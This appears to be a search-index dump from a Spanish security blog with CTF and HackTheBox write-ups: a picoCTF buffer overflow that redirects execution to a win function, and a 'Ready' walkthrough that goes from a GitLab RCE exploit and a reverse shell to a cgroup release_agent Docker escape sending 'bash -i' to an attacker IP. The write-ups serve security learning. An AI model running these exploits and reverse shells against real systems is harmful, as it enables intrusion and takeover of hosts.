[{"content":"","date":"2023-09-07","id":0,"permalink":"/ctf/intro/","summary":"","tags":[],"title":"Intro"},{"content":"","date":"2024-01-08","id":1,"permalink":"/ctf/caixabankk/","summary":"","tags":[],"title":"CaixaBank Tech"},{"content":"","date":"2024-01-08","id":2,"permalink":"/ctf/picoctf/","summary":"","tags":[],"title":"PicoCTF"},{"content":"","date":"2023-09-07","id":3,"permalink":"/blog/","summary":"","tags":[],"title":"Blog"},{"content":"","date":"2023-09-07","id":4,"permalink":"/writeups/intro/","summary":"","tags":[],"title":"Intro"},{"content":"Material / InformaciÃ³n Dominio: saturn.picoctf.net Puerto: 63667 (Puede variar) Binario (vuln) Script en c del binario (vuln.c) #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026#34;asm.h\u0026#34; #define BUFSIZE 32 #define FLAGSIZE 64 void win() { char buf[FLAGSIZE]; FILE *f = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (f == NULL) { printf(\u0026#34;%s %s\u0026#34;, \u0026#34;Please create \u0026#39;flag.txt\u0026#39; in this directory with your\u0026#34;, \u0026#34;own debugging flag.\\n\u0026#34;); exit(0); } fgets(buf,FLAGSIZE,f); printf(buf); } void vuln(){ char buf[BUFSIZE]; gets(buf); printf(\u0026#34;Okay, time to return... Fingers Crossed... Jumping to 0x%x\\n\u0026#34;, get_return_address()); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(\u0026#34;Please enter your string: \u0026#34;); vuln(); return 0; } Empezamos\u0026hellip;\nPrimero ejecutamos el script desde gdb-peda y le mandamos muchas \u0026ldquo;A\u0026rdquo;\npython2 -c \u0026#39;print \u0026#34;A\u0026#34; * 100\u0026#39; | ./vuln Please enter your string: Okay, time to return... Fingers Crossed... Jumping to 0x41414141 zsh: done python2 -c \u0026#39;print \u0026#34;A\u0026#34; * 100\u0026#39; | zsh: segmentation fault ./vuln Nos devuelve el error segmentation fault, eso es porque hemos puesto un input mÃ¡s grande que el esperado y hemos sobreescrito registros de la memoria. Esto pasa porque en la funciÃ³n vuln se usa la funciÃ³n gets() la cual no hace ninguna verificaciÃ³n del tamaÃ±o de la entrada, lo que da paso a un desbordamiento del buffer\nEl script mostrÃ³ el siguiente mensaje Jumping to 0x41414141, Si es verdad el mensaje significa que estamos saltando a la direcciÃ³n 0x41414141, asÃ­ que hemos conseguido sobreescribir el EIP a 0x41414141 que \u0026ldquo;41\u0026rdquo; significa \u0026ldquo;A\u0026rdquo;\nPero no nos podemos fiar de ese mensaje asÃ­ que vamos a ejecutar el script con gdb-peda para comprobar el valor del EIP\n\u0026gt; gdb ./vuln gdb-peda$ r Please enter your string: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Okay, time to return... Fingers Crossed... Jumping to 0x41414141 Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0x41 (\u0026#39;A\u0026#39;) EBX: 0x41414141 (\u0026#39;AAAA\u0026#39;) ECX: 0xffffcf2c --\u0026gt; 0xf2f7c200 EDX: 0x1 ESI: 0x8049350 (\u0026lt;__libc_csu_init\u0026gt;:\tendbr32) EDI: 0xf7ffcba0 --\u0026gt; 0x0 EBP: 0x41414141 (\u0026#39;AAAA\u0026#39;) ESP: 0xffffcfb0 (\u0026#39;A\u0026#39; \u0026lt;repeats 52 times\u0026gt;) EIP: 0x41414141 (\u0026#39;AAAA\u0026#39;) EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x41414141 [------------------------------------stack-------------------------------------] 0000| 0xffffcfb0 (\u0026#39;A\u0026#39; \u0026lt;repeats 52 times\u0026gt;) 0004| 0xffffcfb4 (\u0026#39;A\u0026#39; \u0026lt;repeats 48 times\u0026gt;) 0008| 0xffffcfb8 (\u0026#39;A\u0026#39; \u0026lt;repeats 44 times\u0026gt;) 0012| 0xffffcfbc (\u0026#39;A\u0026#39; \u0026lt;repeats 40 times\u0026gt;) 0016| 0xffffcfc0 (\u0026#39;A\u0026#39; \u0026lt;repeats 36 times\u0026gt;) 0020| 0xffffcfc4 (\u0026#39;A\u0026#39; \u0026lt;repeats 32 times\u0026gt;) 0024| 0xffffcfc8 (\u0026#39;A\u0026#39; \u0026lt;repeats 28 times\u0026gt;) 0028| 0xffffcfcc (\u0026#39;A\u0026#39; \u0026lt;repeats 24 times\u0026gt;) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x41414141 in ?? () gdb-peda$ Ahora ya sÃ­ que podemos confirmar que tenemos la capacidad de sobreescribir el EIP.\nEl siguiente paso serÃ¡ calcular cuantas \u0026ldquo;A\u0026rdquo; tenemos que poner hasta llegar al EIP, esto lo podrÃ­amos hacer manual, o usar la siguiente funciÃ³n de gdb\ngdb-peda$ pattern_create 100 \u0026#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\u0026#39; Esto nos crea una cadena de caracteres especialmente diseÃ±ada para esto. Una vez creada la mandamos al programa\nPor Ãºltimo para terminar de calcularlo le pasaremos el valor del EIP para que gdb-peda calcule el offset.\ngdb-peda$ pattern offset $eip 1094796865 found at offset: 44 Ya tenemos el offset 44.\nVamos a analizar un poco el programa para entenderlo.\nEn la funcion vuln\nvoid vuln(){ char buf[BUFSIZE]; gets(buf); printf(\u0026#34;Okay, time to return... Fingers Crossed... Jumping to 0x%x\\n\u0026#34;, get_return_address()); } Se llama a otra funciÃ³n llamada get_return_address, esta funciÃ³n no se define en ninguna parte de este cÃ³digo asÃ­ que vamos a abrir el binario con ghydra para investigar esta funciÃ³n.\nundefined4 get_return_address(void) { int unaff_EBP; return *(undefined4 *)(unaff_EBP + 4); } Parece que esta devolviendo el valor del EBP + 4 posiciones, Pero que hay 4 posiciones mÃ¡s arriba del EBP?\nPara saberlo vamos a calcular la cantidad de \u0026ldquo;A\u0026rdquo; que necesitamos para sobreescribir el EBP, igual que hemos hecho con el EIP\ngdb-peda$ pattern offset $ebp found at offset: 40 Si para llegar al EBP necesitamos 40 \u0026ldquo;A\u0026rdquo; i para el EIP necesitamos 44 \u0026ldquo;A\u0026rdquo; lo que hay 4 bytes mÃ¡s arriba del EBP es el EIP. Para verlo desde gdb podemos hacer lo siguiente.\nCreamos un payload con 40 \u0026ldquo;A\u0026rdquo;, 4 \u0026ldquo;B\u0026rdquo; y 4 \u0026ldquo;C\u0026rdquo;\npython3 -c \u0026#39;print(\u0026#34;A\u0026#34; * 40 + \u0026#34;B\u0026#34; * 4 + \u0026#34;C\u0026#34; * 4)\u0026#39; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC Al mandarlo desde gdb podemos comprobar la conclusiÃ³n sacada anteriormente\nEBP: 0x42424242 (\u0026#39;BBBB\u0026#39;) ESP: 0xffffcfb0 --\u0026gt; 0xf7c21600 --\u0026gt; 0xbad06 EIP: 0x43434343 (\u0026#39;CCCC\u0026#39;) Ahora ya sabemos bien que hace la funciÃ³n vuln, ahora vamos a ir con la win.\nFunciÃ³n win\nvoid win() { char buf[FLAGSIZE]; FILE *f = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (f == NULL) { printf(\u0026#34;%s %s\u0026#34;, \u0026#34;Please create \u0026#39;flag.txt\u0026#39; in this directory with your\u0026#34;, \u0026#34;own debugging flag.\\n\u0026#34;); exit(0); } fgets(buf,FLAGSIZE,f); printf(buf); } Podemos intuir que por esta funciÃ³n estarÃ¡ la flag, ya que estÃ¡ abriendo un archivo en modo lectura llamado flag.txt\u0026hellip;\nEs curioso porque la funciÃ³n win no se llama en ningÃºn punto del script, de hecho desde la funciÃ³n main solo se llama a la funcion vuln() y en ninguna parte de la funciÃ³n vuln() hemos visto que se llame a la funciÃ³n win()\nint main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(\u0026#34;Please enter your string: \u0026#34;); vuln(); return 0; } Pero aquÃ­ viene la magia, aunque no se llame a la funciÃ³n vuln, la podemos llamar nosotros, ya que tenemos el control sobre el EIP y podemos redirigir el flujo del programa hacia la funciÃ³n win\nPrimero vamos a buscar desde gdb-peda la direcciÃ³n de la funciÃ³n win\ngdb-peda$ disassemble win Dump of assembler code for function win: 0x080491f6 \u0026lt;+0\u0026gt;:\tendbr32 0x080491fa \u0026lt;+4\u0026gt;:\tpush ebp 0x080491fb \u0026lt;+5\u0026gt;:\tmov ebp,esp 0x080491fd \u0026lt;+7\u0026gt;:\tpush ebx 0x080491fe \u0026lt;+8\u0026gt;:\tsub esp,0x54 0x08049201 \u0026lt;+11\u0026gt;:\tcall 0x8049130 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 0x08049206 \u0026lt;+16\u0026gt;:\tadd ebx,0x2dfa 0x0804920c \u0026lt;+22\u0026gt;:\tsub esp,0x8 0x0804920f \u0026lt;+25\u0026gt;:\tlea eax,[ebx-0x1ff8] 0x08049215 \u0026lt;+31\u0026gt;:\tpush eax 0x08049216 \u0026lt;+32\u0026gt;:\tlea eax,[ebx-0x1ff6] 0x0804921c \u0026lt;+38\u0026gt;:\tpush eax 0x0804921d \u0026lt;+39\u0026gt;:\tcall 0x80490c0 \u0026lt;fopen@plt\u0026gt; 0x08049222 \u0026lt;+44\u0026gt;:\tadd esp,0x10 0x08049225 \u0026lt;+47\u0026gt;:\tmov DWORD PTR [ebp-0xc],eax 0x08049228 \u0026lt;+50\u0026gt;:\tcmp DWORD PTR [ebp-0xc],0x0 0x0804922c \u0026lt;+54\u0026gt;:\tjne 0x8049258 \u0026lt;win+98\u0026gt; 0x0804922e \u0026lt;+56\u0026gt;:\tsub esp,0x4 0x08049231 \u0026lt;+59\u0026gt;:\tlea eax,[ebx-0x1fed] 0x08049237 \u0026lt;+65\u0026gt;:\tpush eax 0x08049238 \u0026lt;+66\u0026gt;:\tlea eax,[ebx-0x1fd8] 0x0804923e \u0026lt;+72\u0026gt;:\tpush eax 0x0804923f \u0026lt;+73\u0026gt;:\tlea eax,[ebx-0x1fa3] 0x08049245 \u0026lt;+79\u0026gt;:\tpush eax 0x08049246 \u0026lt;+80\u0026gt;:\tcall 0x8049040 \u0026lt;printf@plt\u0026gt; 0x0804924b \u0026lt;+85\u0026gt;:\tadd esp,0x10 0x0804924e \u0026lt;+88\u0026gt;:\tsub esp,0xc 0x08049251 \u0026lt;+91\u0026gt;:\tpush 0x0 0x08049253 \u0026lt;+93\u0026gt;:\tcall 0x8049090 \u0026lt;exit@plt\u0026gt; 0x08049258 \u0026lt;+98\u0026gt;:\tsub esp,0x4 0x0804925b \u0026lt;+101\u0026gt;:\tpush DWORD PTR [ebp-0xc] 0x0804925e \u0026lt;+104\u0026gt;:\tpush 0x40 0x08049260 \u0026lt;+106\u0026gt;:\tlea eax,[ebp-0x4c] 0x08049263 \u0026lt;+109\u0026gt;:\tpush eax 0x08049264 \u0026lt;+110\u0026gt;:\tcall 0x8049060 \u0026lt;fgets@plt\u0026gt; 0x08049269 \u0026lt;+115\u0026gt;:\tadd esp,0x10 0x0804926c \u0026lt;+118\u0026gt;:\tsub esp,0xc 0x0804926f \u0026lt;+121\u0026gt;:\tlea eax,[ebp-0x4c] 0x08049272 \u0026lt;+124\u0026gt;:\tpush eax 0x08049273 \u0026lt;+125\u0026gt;:\tcall 0x8049040 \u0026lt;printf@plt\u0026gt; 0x08049278 \u0026lt;+130\u0026gt;:\tadd esp,0x10 0x0804927b \u0026lt;+133\u0026gt;:\tnop 0x0804927c \u0026lt;+134\u0026gt;:\tmov ebx,DWORD PTR [ebp-0x4] 0x0804927f \u0026lt;+137\u0026gt;:\tleave 0x08049280 \u0026lt;+138\u0026gt;:\tret End of assembler dump. Vamos a hacer que el EIP apunte a 0x080491f6 para poder llamar a la funciÃ³n win.\npython2 -c \u0026#34;from struct import pack; eip = pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080491f6); print b\u0026#39;A\u0026#39; * 44 + eip\u0026#34; | ./vuln Please enter your string: Okay, time to return... Fingers Crossed... Jumping to 0x80491f6 Please create \u0026#39;flag.txt\u0026#39; in this directory with your own debugging flag. Hemos podido redirigir el programa hacia la funciÃ³n win!!!! Pero claro, nosotros no tenemos la flag, asÃ­ que vamos a ejecutarlo desde el dominio y puerto que nos han proporcionado al inicio\npython2 -c \u0026#34;from struct import pack; eip = pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080491f6); print b\u0026#39;A\u0026#39; * 44 + eip\u0026#34; | nc saturn.picoctf.net 56276 Please enter your string: Okay, time to return... Fingers Crossed... Jumping to 0x80491f6 picoCTF{addr3ss3s_ar3_3asy...} ","date":"2024-02-10","id":5,"permalink":"/ctf/picoctf/binaryexplotation-copy/bof1/","summary":"Material / InformaciÃ³n Dominio: saturn.picoctf.net Puerto: 63667 (Puede variar) Binario (vuln) Script en c del binario (vuln.c) #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.","tags":["CTF","BoF","Binary Explotation"],"title":"Buffer Overflow 1"},{"content":"","date":"2023-09-07","id":6,"permalink":"/writeups/hackthebox/","summary":"","tags":[],"title":"HackTheBox"},{"content":"Bienvenido a la secciÃ³n de CTF, aquÃ­ vas a encontrar resoluciones de CTF, de plataformas como PicoCTF\nEstadÃ­sticas CTF 1\n1\n0\nTipos Web\n0\nForense\n0\n","date":"2023-10-29","id":7,"permalink":"/ctf/intro/bienvenido/","summary":"Bienvenido a la secciÃ³n de CTF, aquÃ­ vas a encontrar resoluciones de CTF, de plataformas como PicoCTF\nEstadÃ­sticas CTF 1","tags":[],"title":"Bienvenido"},{"content":"Bienvenido a la secciÃ³n de writeups, aquÃ­ vas a encontrar resoluciones de mÃ¡quinas, tanto escritas como en formato video, de plataformas como HackTheBox, TryHackMe y HackMyVM.\nEstadÃ­sticas writeups 12\n22\n12\n1\n4\n43\n1\n0\nEasy\n37\nMedium\n9\nHard\n1\nInsane\n0\nTotal: 47 ","date":"2023-10-29","id":8,"permalink":"/writeups/intro/bienvenido/","summary":"Bienvenido a la secciÃ³n de writeups, aquÃ­ vas a encontrar resoluciones de mÃ¡quinas, tanto escritas como en formato video, de plataformas como HackTheBox, TryHackMe y HackMyVM.","tags":[],"title":"Bienvenido"},{"content":"a\n","date":"2023-09-07","id":9,"permalink":"/writeups/tryhackme/","summary":"a","tags":[],"title":"TryHackMe"},{"content":"","date":"2023-09-07","id":10,"permalink":"/writeups/hackmyvm/","summary":"","tags":[],"title":"HackMyVm"},{"content":"","date":"2023-09-07","id":11,"permalink":"/writeups/","summary":"","tags":[],"title":"Writeups"},{"content":"","date":"2023-09-07","id":12,"permalink":"/writeups/vulnhub/","summary":"","tags":[],"title":"VulnHub"},{"content":"","date":"2024-06-07","id":13,"permalink":"/contributors/","summary":"","tags":[],"title":"Contributors"},{"content":"","date":"2024-06-07","id":14,"permalink":"/contributors/d3b0o/","summary":"","tags":[],"title":"d3b0o"},{"content":"","date":"2024-06-07","id":15,"permalink":"/tags/docker/","summary":"","tags":[],"title":"docker"},{"content":"","date":"2024-06-07","id":16,"permalink":"/tags/gitlab/","summary":"","tags":[],"title":"gitlab"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nping -c 1 10.10.10.220 PING 10.10.10.220 (10.10.11.254) 56(84) bytes of data. 64 bytes from 10.10.11.254: icmp_seq=1 ttl=63 time=38.4 ms --- 10.10.10.220 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 38.381/38.381/38.381/0.000 ms Tenemos conexiÃ³n y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.220 -oG allPorts ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobaciÃ³n de sÃ­ la mÃ¡quina estÃ¡ activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.10.220 5 â”‚ [*] Open ports: 22,5080 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts bÃ¡sicos de reconocimientos de nmap\n\u0026gt; nmap -p22,5080 -sCV 10.10.10.220 -oN versions PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18ğŸ’¿9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 5080/tcp open http nginx | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit |_http-trane-info: Problem with XML parsing of /evox/about ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos Puerto 5080 Dentro del puerto 5080 hay un gitlab corriendo. Cuando entramos, nos deja crear una cuenta, asÃ­ que creamos una cuenta y entramos con ella.\nUna vez estamos autentificados si vamos al /help aparece la versiÃ³n del gitlab: 11.4.7\nCon searchsploit identificamos que es una versiÃ³n vulnerable a un RCE\nsearchsploit gitlab 11.4.7 ------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------- --------------------------------- GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.py GitLab 11.4.7 - Remote Code Execution (Aut | ruby/webapps/49257.py GitLab CE/EE \u0026lt; 16.7.2 - Password Reset | java/remote/51889.txt ------------------------------------------- --------------------------------- Ninguno de estos exploits me funciono asÃ­ que vamos a usar otro que encontrÃ© por github\ngit clone https://github.com/dotPY-hax/gitlab_RCE cd gitlab_RCE python3 gitlab_rce.py http://10.10.10.220:5080 10.10.14.32 Gitlab Exploit by dotPY [insert fancy ascii art] registering LonNmLDZ17:5FPfA5fANt - 200 Getting version of http://10.10.10.220:5080 - 200 The Version seems to be 11.4.7! Choose wisely delete user LonNmLDZ17 - 200 [0] - GitlabRCE1147 - RCE for Version \u0026lt;=11.4.7 [1] - GitlabRCE1281LFIUser - LFI for version 10.4-12.8.1 and maybe more [2] - GitlabRCE1281RCE - RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP type a number and hit enter to choose exploit: 0 Start a listener on port 42069 and hit enter (nc -vlnp 42069) registering SrqNdC0XFY:XDdWDl100T - 200 hacking in progress - 200 delete user SrqNdC0XFY - 200 Durante la ejecuciÃ³n nos pide que nos pongamos en escucha por un puerto con nc (nc -nlvp 42069)\nUna vez terminado el script, recibimos la reverse shell.\nEscalada de privilegios Antes de seguir, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb, pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por Ãºltimo, si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash DespuÃ©s de una bÃºsqueda por el sistema, encontramos una carpeta dentro del /opt llamada backups, la cual llama la atenciÃ³n\ngit@gitlab:/opt$ ls backup gitlab Dentro de backup, hacemos un cat a todos los archivos y filtramos por informaciÃ³n relevante como por ejemplo password\ngit@gitlab:/opt/backup$ cat * | grep password gitlab_rails[\u0026#39;initial_root_password\u0026#39;]=File.read(\u0026#39;/root_pass\u0026#39;) #### Email account password # gitlab_rails[\u0026#39;incoming_email_password\u0026#39;] = \u0026#34;[REDACTED]\u0026#34; # password: \u0026#39;_the_password_of_the_bind_user\u0026#39; # password: \u0026#39;_the_password_of_the_bind_user\u0026#39; # \u0026#39;/users/password\u0026#39;, #### Change the initial default admin password and shared runner registration tokens. # gitlab_rails[\u0026#39;initial_root_password\u0026#39;] = \u0026#34;password\u0026#34; # gitlab_rails[\u0026#39;db_password\u0026#39;] = nil # gitlab_rails[\u0026#39;redis_password\u0026#39;] = nil gitlab_rails[\u0026#39;smtp_password\u0026#39;] = \u0026#34;wW59......\u0026#34; # gitlab_shell[\u0026#39;http_settings\u0026#39;] = { user: \u0026#39;username\u0026#39;, password: \u0026#39;password\u0026#39;, ca_file: \u0026#39;/etc/ssl/cert.pem\u0026#39;, ca_path: \u0026#39;/etc/pki/tls/certs\u0026#39;, self_signed_cert: false} ##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab` # postgresql[\u0026#39;sql_user_password\u0026#39;] = \u0026#39;SQL_USER_PASSWORD_HASH\u0026#39; # postgresql[\u0026#39;sql_replication_password\u0026#39;] = \u0026#34;md5 hash of postgresql password\u0026#34; # You can generate with `gitlab-ctl pg-password-md5 \u0026lt;dbuser\u0026gt;` # redis[\u0026#39;password\u0026#39;] = \u0026#39;redis-password-goes-here\u0026#39; ####! **Master password should have the same value defined in ####! redis[\u0026#39;password\u0026#39;] to enable the instance to transition to/from # redis[\u0026#39;master_password\u0026#39;] = \u0026#39;redis-password-goes-here\u0026#39; # geo_secondary[\u0026#39;db_password\u0026#39;] = nil # geo_postgresql[\u0026#39;pgbouncer_user_password\u0026#39;] = nil # password: PASSWORD ###! generate this with `echo -n \u0026#39;$password + $username\u0026#39; | md5sum` # pgbouncer[\u0026#39;auth_query\u0026#39;] = \u0026#39;SELECT username, password FROM public.pg_shadow_lookup($1)\u0026#39; # password: MD5_PASSWORD_HASH # postgresql[\u0026#39;pgbouncer_user_password\u0026#39;] = nil Entre toda la informaciÃ³n reportada, vemos una contraseÃ±a: wW59\u0026hellip;\u0026hellip;\nLa cual nos sirve para el usuario root\ngit@gitlab:/opt/backup$ su root Password: root@gitlab:/opt/backup# Con un ls -l al la raiz, identificamos que estamos dentro de un contenedor docker, ya que hay un .dockerenv\nroot@gitlab:/opt/backup# ls -la / total 100 drwxr-xr-x 1 root root 4096 Apr 5 2022 . drwxr-xr-x 1 root root 4096 Apr 5 2022 .. -rwxr-xr-x 1 root root 0 Apr 5 2022 .dockerenv Empezamos enumerando las capabilites del contenedor, con\nroot@gitlab:/opt/backup# capsh --print Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37 Entre todas las capabilities reportadas encontramos la cap_sys_admin\nEl hecho de que exista esta capability nos permite salir del docker, de la siguiente forma\nNos ponemos en escucha por el puerto 444\nnc -nlvp 444 Ejecutamos todo esto en la mÃ¡quina vÃ­ctima\nmkdir /tmp/cgrp \u0026amp;\u0026amp; mount -t cgroup -o rdma cgroup /tmp/cgrp \u0026amp;\u0026amp; mkdir /tmp/cgrp/x echo 1 \u0026gt; /tmp/cgrp/x/notify_on_release host_path=`sed -n \u0026#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p\u0026#39; /etc/mtab` echo \u0026#34;$host_path/cmd\u0026#34; \u0026gt; /tmp/cgrp/release_agent echo \u0026#39;#!/bin/bash\u0026#39; \u0026gt; /cmd echo \u0026#34; bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.32/444 0\u0026gt;\u0026amp;1\u0026gt; $host_path/output\u0026#34; \u0026gt;\u0026gt; /cmd chmod a+x /cmd bash -c \u0026#34;echo \\$\\$ \u0026gt; /tmp/cgrp/x/cgroup.procs\u0026#34; Nos llega la reverse shell!!!\n","date":"2024-06-07","id":17,"permalink":"/writeups/hackthebox/ready/","summary":"En esta mÃ¡quina, explotamos una vulnerabilidad CVE en GitLab que nos permite ejecutar comandos. Para la escalada de privilegios, logramos escapar de un contenedor Docker que tiene la capability cap_sys_admin","tags":["gitlab","docker"],"title":"Ready"},{"content":"","date":"2024-06-07","id":18,"permalink":"/tags/","summary":"","tags":[],"title":"Tags"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nping -c 1 10.10.10.194 PING 10.10.10.194 (10.10.11.254) 56(84) bytes of data. 64 bytes from 10.10.11.254: icmp_seq=1 ttl=63 time=38.4 ms --- 10.10.10.194 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 38.381/38.381/38.381/0.000 ms Tenemos conexiÃ³n y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.194 -oG allPorts ExplicaciÃ³n parÃ¡metros\rParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los 